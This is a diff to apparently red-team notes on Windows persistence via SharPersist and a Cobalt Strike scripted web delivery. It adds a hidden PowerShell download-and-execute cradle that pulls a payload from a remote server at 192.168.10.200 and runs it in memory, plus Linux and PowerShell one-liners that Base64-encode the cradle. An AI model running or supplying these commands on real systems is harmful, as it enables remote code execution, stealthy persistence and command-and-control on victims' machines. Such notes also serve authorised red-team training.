@@ -99,7 +99,13 @@
 
 ### Persistence for MS Windows via SharPersist
 1. First generate the **x64 powershell** payload by **Attacks -> Web by Delivery -> Scripted Web Del (S)**
-2. E.g. it will be something like
+2. The above will generate a **PS payload, hosted on the CS TeamServer and will be run in memory**
+3. E.g. it will be something like
 ```
 powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.10.200:80/64bit'))"
+```
+3. To avoid issues, Base64 it as following:
+```
+Linux: echo -en ""powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.10.200:80/64bit'))""" | iconv -t UTF-16LE | base64 -w 0
+PS: [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('IEX ((new-object net.webclient).downloadstring("http://192.168.10.200:80/64bit"))'))
 ```
